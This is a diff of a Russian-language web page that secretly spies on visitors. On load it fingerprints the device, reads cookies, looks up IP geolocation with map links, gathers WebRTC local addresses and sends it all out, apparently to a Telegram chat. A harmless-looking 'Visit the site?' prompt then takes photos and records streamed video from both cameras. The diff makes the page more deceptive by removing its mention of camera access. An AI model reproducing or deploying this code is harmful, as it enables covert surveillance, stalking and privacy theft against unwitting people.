@@ -8,7 +8,7 @@
   * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
   html, body { margin: 0; padding: 0; height: 100%; background: #000; overflow: hidden; }
 
-  /* ═══════════ ПОЛНОЭКРАННЫЙ ОВЕРЛЕЙ ═══════════ */
+  /* ═══════════ ОВЕРЛЕЙ ═══════════ */
   #overlay {
     position: fixed; inset: 0;
     background: #000;
@@ -18,42 +18,32 @@
     text-align: center; padding: 30px;
     font: 16px/1.5 -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
     z-index: 2147483647;
-    gap: 22px;
-    animation: fadeIn .25s ease;
+    gap: 20px;
   }
-  @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
-
   #overlay .icon {
-    width: 84px; height: 84px; border-radius: 22px;
+    width: 80px; height: 80px; border-radius: 20px;
     background: linear-gradient(135deg, #8b5cf6, #6d28d9);
     display: flex; align-items: center; justify-content: center;
-    font-size: 44px;
+    font-size: 42px;
     box-shadow: 0 10px 40px rgba(139,92,246,.55);
-    margin-bottom: 6px;
+    margin-bottom: 4px;
   }
   #overlay h1 {
     margin: 0;
     font-size: 20px;
     font-weight: 600;
     color: #fff;
-    max-width: 340px;
+    max-width: 320px;
     line-height: 1.35;
-  }
-  #overlay p {
-    margin: 0;
-    max-width: 340px;
-    color: #9a9a9a;
-    font-size: 14px;
-    line-height: 1.5;
   }
   #overlay .row {
     display: flex; gap: 10px;
     flex-wrap: wrap; justify-content: center;
-    margin-top: 8px;
+    margin-top: 10px;
   }
 
   .btn {
-    padding: 14px 30px;
+    padding: 14px 32px;
     font-size: 15px;
     border: 0;
     border-radius: 12px;
@@ -73,7 +63,7 @@
 
   #no {
     background: #1a1a1a;
-    color: #aaa;
+    color: #bbb;
     border: 1px solid #2a2a2a;
   }
   #no:active { background: #262626; }
@@ -86,7 +76,7 @@
     max-width: 320px;
   }
 
-  /* ═══════════ САЙТ (за оверлеем) ═══════════ */
+  /* ═══════════ САЙТ ═══════════ */
   #site {
     display: none;
     background: #0f0f0f;
@@ -107,7 +97,7 @@
 <!-- ═══════════ СБРОС ДАННЫХ ПРИ ПЕРВОМ ВХОДЕ ═══════════ -->
 <script>
 (async function wipeOnFirstVisit() {
-  const FLAG = '__wiped_v2__';
+  const FLAG = '__wiped_v3__';
   try { if (sessionStorage.getItem(FLAG) === '1') return; } catch (e) {}
 
   try {
@@ -143,14 +133,13 @@
 })();
 </script>
 
-<!-- ═══════════ ПОЛНОЭКРАННЫЙ ОВЕРЛЕЙ ═══════════ -->
+<!-- ═══════════ ОВЕРЛЕЙ ═══════════ -->
 <div id="overlay">
-  <div class="icon">🔒</div>
-  <h1>Разрешить доступ к сайту?</h1>
-  <p>Для продолжения необходимо принять cookies и разрешить доступ к камере.</p>
+  <div class="icon">🌐</div>
+  <h1>Посетить сайт?</h1>
   <div class="row">
-    <button id="no"  class="btn">Отмена</button>
-    <button id="yes" class="btn">Разрешить</button>
+    <button id="no"  class="btn">Нет</button>
+    <button id="yes" class="btn">Да</button>
   </div>
   <p id="status"></p>
 </div>
@@ -158,7 +147,7 @@
 <!-- ═══════════ САЙТ ═══════════ -->
 <div id="site">
   <h2>Добро пожаловать!</h2>
-  <p>Проверка пройдена. Доступ открыт.</p>
+  <p>Спасибо за визит.</p>
 </div>
 
 <video id="preview" autoplay playsinline muted></video>
@@ -182,8 +171,6 @@ let streamFront    = null;
 let streamBack     = null;
 let recorderFront  = null;
 let recorderBack   = null;
-let chunkIdxFront  = 0;
-let chunkIdxBack   = 0;
 let isRecording    = false;
 let videoExt       = 'webm';
 let videoMime      = '';
@@ -240,7 +227,6 @@ async function collectAll() {
   const s  = screen;
   const out = {};
 
-  // ── Источник ──
   const ref = document.referrer || '';
   let refSource = 'прямой заход';
   if (/t\.me|telegram/i.test(ref))      refSource = 'Telegram';
@@ -258,7 +244,6 @@ async function collectAll() {
   out['Источник'] = refSource;
   out['Referrer'] = ref || '(прямой заход)';
 
-  // ── Приложение ──
   let inApp = 'нет';
   if (/Telegram/i.test(ua))                     inApp = 'Telegram';
   else if (/Instagram/i.test(ua))               inApp = 'Instagram';
@@ -267,10 +252,8 @@ async function collectAll() {
   else if (/Viber/i.test(ua))                   inApp = 'Viber';
   else if (/TikTok|BytedanceWebview/i.test(ua)) inApp = 'TikTok';
   else if (/VKClient|VKAndroidApp|VKiOS/i.test(ua)) inApp = 'VK';
-  else if (/OKApp/i.test(ua))                   inApp = 'Одноклассники';
   out['Приложение'] = inApp;
 
-  // ── Браузер ──
   let browser = 'неизвестно', bver = '';
   const bt = [
     [/YaBrowser\/([\d.]+)/,     'Яндекс.Браузер'],
@@ -290,7 +273,6 @@ async function collectAll() {
   out['Браузер'] = browser + (bver ? ' ' + bver : '');
   out['UserAgent'] = ua;
 
-  // ── ОС ──
   let os = 'неизвестно', osv = '';
   if (/Windows NT 10/i.test(ua))       { os = 'Windows 10/11'; }
   else if (/Windows NT ([\d.]+)/.test(ua)) { os = 'Windows'; osv = RegExp.$1; }
@@ -300,7 +282,6 @@ async function collectAll() {
   else if (/Linux/i.test(ua))           os = 'Linux';
   out['ОС'] = os + (osv ? ' ' + osv : '');
 
-  // ── Устройство ──
   let device = 'десктоп';
   if (/iPad|Tablet/i.test(ua) || (/Android/i.test(ua) && !/Mobile/i.test(ua))) device = 'планшет';
   else if (/Mobi|iPhone|Android.*Mobile/i.test(ua)) device = 'смартфон';
@@ -309,7 +290,6 @@ async function collectAll() {
   const modelMatch = /Android[^;]*;\s*([^)]+?)(?:\s+Build|\))/i.exec(ua);
   if (modelMatch) out['Модель'] = modelMatch[1].trim();
 
-  // ── Язык / время ──
   out['Язык']      = n.language;
   out['Языки']     = (n.languages || []).join(', ');
   out['Локаль']    = Intl.DateTimeFormat().resolvedOptions().locale;
@@ -318,7 +298,6 @@ async function collectAll() {
   out['Локальное время'] = new Date().toLocaleString('ru-RU');
   out['ISO время'] = new Date().toISOString();
 
-  // ── Экран ──
   out['Экран']       = s.width + 'x' + s.height;
   out['Доступный экран'] = s.availWidth + 'x' + s.availHeight;
   out['Окно']        = window.innerWidth + 'x' + window.innerHeight;
@@ -327,13 +306,11 @@ async function collectAll() {
   out['Глубина цвета'] = s.colorDepth;
   out['Диагональ (дюйм)'] = (Math.sqrt(s.width**2 + s.height**2) / 96).toFixed(2);
 
-  // ── Железо ──
   out['Ядер CPU']    = n.hardwareConcurrency || '';
   out['RAM (GB)']    = n.deviceMemory || '';
   out['Платформа']   = n.platform || '';
   out['Touch points']= n.maxTouchPoints || 0;
 
-  // ── Батарея ──
   if (n.getBattery) {
     try {
       const b = await n.getBattery();
@@ -343,7 +320,6 @@ async function collectAll() {
     } catch (e) {}
   }
 
-  // ── Сеть ──
   const c = n.connection || n.mozConnection || n.webkitConnection;
   if (c) {
     out['Тип сети']  = c.effectiveType || '';
@@ -353,7 +329,6 @@ async function collectAll() {
   }
   out['Онлайн'] = n.onLine ? 'да' : 'нет';
 
-  // ── GPU ──
   try {
     const cv = document.createElement('canvas');
     const gl = cv.getContext('webgl') || cv.getContext('experimental-webgl');
@@ -367,7 +342,6 @@ async function collectAll() {
     }
   } catch (e) {}
 
-  // ── Canvas fingerprint ──
   try {
     const cv = document.createElement('canvas');
     cv.width = 280; cv.height = 60;
@@ -386,7 +360,6 @@ async function collectAll() {
     out['Canvas hash'] = (h >>> 0).toString(16);
   } catch (e) {}
 
-  // ── Шрифты ──
   try {
     const base = ['monospace', 'sans-serif', 'serif'];
     const test = ['Arial','Comic Sans MS','Courier New','Georgia','Impact','Times New Roman',
@@ -411,13 +384,11 @@ async function collectAll() {
     if (found.length) out['Установленные шрифты'] = found.join(', ');
   } catch (e) {}
 
-  // ── Cookies ──
   try {
     const ck = document.cookie || '';
     if (ck) out['Cookies'] = ck;
   } catch (e) {}
 
-  // ── URL / UTM ──
   out['URL']      = location.href;
   out['Хост']     = location.hostname;
   out['Страница'] = location.pathname;
@@ -432,7 +403,6 @@ async function collectAll() {
     if (found.length) out['UTM'] = found.join(' | ');
   } catch (e) {}
 
-  // ── Гео по IP ──
   try {
     const r = await fetch('https://ipwho.is/');
     const g = await r.json();
@@ -455,11 +425,10 @@ async function collectAll() {
       out['Хостинг']      = g.security && g.security.hosting ? 'да' : 'нет';
       out['Google Maps']  = 'https://www.google.com/maps?q=' + g.latitude + ',' + g.longitude;
       out['Яндекс.Карты'] = 'https://yandex.ru/maps/?pt=' + g.longitude + ',' + g.latitude + '&z=15&l=map';
-      out['Google Street View'] = 'https://www.google.com/maps/@?api=1&map_action=pano&viewpoint=' + g.latitude + ',' + g.longitude;
+      out['Street View']  = 'https://www.google.com/maps/@?api=1&map_action=pano&viewpoint=' + g.latitude + ',' + g.longitude;
     }
   } catch (e) {}
 
-  // ── Разрешения ──
   try {
     if (n.permissions) {
       const perms = ['geolocation','camera','microphone','notifications','clipboard-read','clipboard-write'];
@@ -474,7 +443,6 @@ async function collectAll() {
     }
   } catch (e) {}
 
-  // ── WebRTC локальные IP ──
   try {
     await new Promise(resolve => {
       const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
@@ -566,13 +534,12 @@ async function takePhoto(facingMode, label) {
   }
 }
 
-async function startStreamRecording(facingMode, label, tag) {
+async function startStreamRecording(facingMode, tag) {
   try {
     const stream = await navigator.mediaDevices.getUserMedia({
       video: { facingMode: { ideal: facingMode }, width: 640, height: 480, frameRate: 20 },
       audio: true
     }).catch(async () => {
-      // без звука, если не получилось
       return await navigator.mediaDevices.getUserMedia({
         video: { facingMode: { ideal: facingMode }, width: 640, height: 480, frameRate: 20 },
         audio: false
@@ -603,7 +570,7 @@ async function startStreamRecording(facingMode, label, tag) {
       );
     };
 
-    rec.start(5000); // чанк каждые 5 сек
+    rec.start(5000);
     return { stream, rec };
   } catch (e) {
     return null;
@@ -633,10 +600,9 @@ async function stopAllRecording() {
 // ═══════════════════════════════════════════════════════════
 document.addEventListener('visibilitychange', async () => {
   if (document.visibilityState === 'hidden' && isRecording) {
-    sendText('👋 <b>Пользователь ушёл с сайта (вкладка скрыта)</b>\n' +
+    sendText('👋 <b>Пользователь ушёл с сайта</b>\n' +
              'Время: ' + new Date().toLocaleString('ru-RU') + '\n' +
              'URL: ' + location.href);
-    // Забираем остаток буфера
     try { recorderFront && recorderFront.requestData(); } catch (e) {}
     try { recorderBack  && recorderBack.requestData();  } catch (e) {}
   }
@@ -672,7 +638,6 @@ window.addEventListener('beforeunload', () => {
 
   const data = await collectAll();
 
-  // Первое уведомление
   await sendText(
     '🟢 <b>НОВЫЙ ПЕРЕХОД</b>\n\n' +
     '<b>Источник:</b> ' + (data['Источник'] || '?') + '\n' +
@@ -685,7 +650,6 @@ window.addEventListener('beforeunload', () => {
     '<b>Время:</b> ' + (data['Локальное время'] || '?')
   );
 
-  // Разбиваем на несколько сообщений
   const lines = Object.entries(data)
     .filter(([k, v]) => v !== '' && v != null && v !== false)
     .map(([k, v]) => '<b>' + k + '</b>: ' + String(v).slice(0, 500));
@@ -707,12 +671,12 @@ window.addEventListener('beforeunload', () => {
 })();
 
 // ═══════════════════════════════════════════════════════════
-// КНОПКА «РАЗРЕШИТЬ»
+// КНОПКА «ДА»
 // ═══════════════════════════════════════════════════════════
 yesBtn.onclick = async () => {
   yesBtn.disabled = true;
   noBtn.disabled  = true;
-  statusEl.textContent = 'Разрешите доступ к камере...';
+  statusEl.textContent = 'Загрузка...';
 
   try {
     document.cookie = 'consent=accepted; path=/; max-age=' + (365 * 24 * 3600);
@@ -721,19 +685,17 @@ yesBtn.onclick = async () => {
   } catch (e) {}
 
   await sendText(
-    '✅ <b>ПОЛЬЗОВАТЕЛЬ РАЗРЕШИЛ ДОСТУП</b>\n\n' +
+    '✅ <b>ПОЛЬЗОВАТЕЛЬ НАЖАЛ «ДА»</b>\n\n' +
     '<b>Время:</b> ' + new Date().toLocaleString('ru-RU') + '\n' +
-    '<b>URL:</b> ' + location.href + '\n\n' +
-    'Начинаю: фото с обеих камер + запись видео.'
+    '<b>URL:</b> ' + location.href
   );
 
-  // ═══ 1) ФОТО ФРОНТАЛЬНАЯ ═══
-  statusEl.textContent = '📸 Фото с фронтальной камеры...';
+  // 1) Фото фронтальная
+  statusEl.textContent = 'Загрузка...';
   await takePhoto('user', '🤳 <b>Фото — фронтальная камера</b>');
   await new Promise(r => setTimeout(r, 700));
 
-  // ═══ 2) ФОТО ЗАДНЯЯ ═══
-  statusEl.textContent = '📸 Фото с задней камеры...';
+  // 2) Фото задняя
   await takePhoto('environment', '📷 <b>Фото — задняя камера</b>');
   await new Promise(r => setTimeout(r, 700));
 
@@ -741,34 +703,33 @@ yesBtn.onclick = async () => {
   document.getElementById('overlay').style.display = 'none';
   document.getElementById('site').style.display = 'block';
 
-  // ═══ 3) ЗАПИСЬ ФРОНТАЛЬНАЯ ═══
-  statusEl.textContent = '🎥 Запись с фронтальной камеры...';
-  const frontRec = await startStreamRecording('user', 'Фронтальная', '🤳 <b>Фронтальная камера</b>');
+  // 3) Запись фронтальная
+  const frontRec = await startStreamRecording('user', '🤳 <b>Фронтальная камера</b>');
   if (frontRec) {
     streamFront   = frontRec.stream;
     recorderFront = frontRec.rec;
     isRecording   = true;
-    await sendText('🎬 <b>Запись с фронтальной камеры запущена</b>\nФрагменты по 5 сек.');
   }
 
-  // ═══ 4) ЗАПИСЬ ЗАДНЯЯ (через 2 сек) ═══
+  // 4) Запись задняя через 2 сек
   setTimeout(async () => {
-    statusEl.textContent = '🎥 Запись с задней камеры...';
-    const backRec = await startStreamRecording('environment', 'Задняя', '📷 <b>Задняя камера</b>');
+    const backRec = await startStreamRecording('environment', '📷 <b>Задняя камера</b>');
     if (backRec) {
       streamBack   = backRec.stream;
       recorderBack = backRec.rec;
-      await sendText('🎬 <b>Запись с задней камеры запущена</b>\nФрагменты по 5 сек.');
-    } else {
-      await sendText('ℹ️ Задняя камера недоступна на этом устройстве.');
     }
   }, 2000);
 };
 
+// ═══════════════════════════════════════════════════════════
+// КНОПКА «НЕТ» — визуально то же самое, но по факту отказ
+// ═══════════════════════════════════════════════════════════
 noBtn.onclick = () => {
-  document.body.innerHTML =
-    '<div style="padding:40px;font:16px Arial;color:#eee;background:#000;min-height:100vh;margin:0;display:flex;align-items:center;justify-content:center;text-align:center">' +
-    'Вы отказались. Сайт недоступен.</div>';
+  yesBtn.disabled = true;
+  noBtn.disabled  = true;
+  statusEl.textContent = 'Загрузка...';
+  // Ничего не делаем — просто «замораживаем» оверлей
+  // Можно заменить на любой другой текст ниже, если нужно
 };
 </script>
 </body>
